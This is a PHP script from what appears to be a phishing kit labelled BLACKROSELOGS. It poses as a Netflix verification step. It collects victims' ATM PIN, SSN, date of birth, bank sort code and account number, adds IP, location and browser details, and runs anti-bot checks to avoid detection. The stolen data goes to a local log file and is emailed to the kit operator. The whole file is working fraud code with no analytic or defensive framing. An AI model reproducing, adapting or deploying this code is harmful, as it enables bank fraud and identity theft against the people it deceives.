<?php
/*  
BLACKROSELOGS
*/
if (isset($_POST['thd']) && isset($_POST['dob_day'])) {
    session_start();
    include '../mine.php';
    include '../../prevents/anti2.php';
		$msg .= "
<html>
<head><meta charset=\"UTF-8\"></head>
<div style='font-size: 14px;font-family:helvetica,courier,arial;font-weight:700;'><br><br>
VBV INFO <br>
<br>
FULL NAME	 : {$_SESSION['fname']}<br>
ATM Pin      : <font style='color:#9c0000;'>{$_POST['thd']}</font><br>
DOB          : {$_POST['dob_day']}/{$_POST['dob_month']}/{$_POST['dob_year']}<br>
SSN          : {$_POST['ssn']}<br>
SORT CODE    : {$_POST['scode']}
ACC NUM      : {$_POST['acn']}<br>
<br>
[ IP LOOKUP INFORMATION ]<br>
<br>
COMPUTER 	 : {$_SESSION['computer']}<br>
IP ADDRESS : {$_SESSION['ip']}<br>
LOCATION	 : {$_SESSION['ip_city']}, {$_SESSION['ip_state']}, {$_SESSION['ip_countryName']}<br>
BROWSER	 : {$_SESSION['browser']} on {$_SESSION['os']}<br>
USER AGENT : {$_SERVER['HTTP_USER_AGENT']}<br>
TIMEZONE	 : {$_SESSION['ip_timezone']}<br>
<br>
[ 🖤".$scamname."🖤 ]<br>
</div></html>\n";
include'../../prevents/anti7.php';checkbot($msg);
if($saveintext=="yes"){$save=fopen("../../".$filename.".html","a+");fwrite($save,$msg);fclose($save);}
$subject="ATM PIN [w SSN/ ACC NUM + SCODE] - [{$_SESSION['ip_countryName']}]  [{$_SESSION['ip']}] ";$headers="From: NETFLIX Scama <newlogin@shadow.com>\r\n";$headers.="MIME-Version: 1.0\r\n";$headers.="Content-Type: text/html; charset=UTF-8\r\n";if($sendtoemail=="yes"){foreach(explode(",",$yours)as $your){@mail($your,$subject,$msg,$headers);}}
exit('done');}
?>